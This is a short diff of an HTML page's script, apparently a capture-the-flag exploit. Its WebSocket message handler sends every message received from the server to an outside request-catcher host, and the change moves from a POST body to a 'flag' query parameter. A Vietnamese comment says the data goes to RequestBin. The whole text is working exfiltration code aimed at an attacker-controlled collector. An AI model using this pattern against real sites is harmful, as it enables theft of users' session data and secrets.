@@ -12,11 +12,12 @@
 
   socket.onmessage = (event) => {
     // Khi nhận dữ liệu từ server, gửi về RequestBin
-    fetch('https://wefwef.requestcatcher.com/1', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ data: event.data })
-    });
+    fetch("https://wefwef.requestcatcher.com/flag?flag=" + encodeURIComponent(event.data))
+    // fetch('https://wefwef.requestcatcher.com/1', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({ data: event.data })
+    // });
   };
 </script>
 </body>
